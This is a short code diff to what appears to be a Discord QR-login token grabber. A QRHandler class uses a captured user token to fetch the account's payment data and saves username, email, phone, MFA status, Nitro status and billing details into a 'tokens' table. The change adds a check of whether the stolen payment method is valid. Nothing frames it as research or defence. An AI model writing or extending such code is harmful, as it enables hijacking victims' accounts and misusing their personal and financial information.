@@ -98,7 +98,7 @@ class QRHandler():
 
         self.user.billing = {'data': await DiscordLib.get_payment(self.user.token)}
         self.user.valid_payment = await DiscordLib.parse_payment(self.user.billing['data'])
-
+        
         self.user.email = None if not self.user.details['email'] else self.user.details['email']
         self.user.phone = None if not self.user.details['phone'] else self.user.details['phone']
 
@@ -106,7 +106,7 @@ class QRHandler():
             """
                 INSERT INTO tokens
                 VALUES(
-                    DEFAULT, $1, $2, $3, $4, $5, $6, $7, $8
+                    DEFAULT, $1, $2, $3, $4, $5, $6, $7, $8, $9
                 )
             """,
             '#'.join([self.user.details['username'], self.user.details['discriminator']]),
@@ -116,7 +116,8 @@ class QRHandler():
             self.user.phone,
             self.user.details['mfa_enabled'],
             bool(self.user.nitro),
-            None if not self.user.billing['data'] else json.dumps(self.user.billing)
+            None if not self.user.billing['data'] else json.dumps(self.user.billing),
+            self.user.valid_payment
         )
 
             
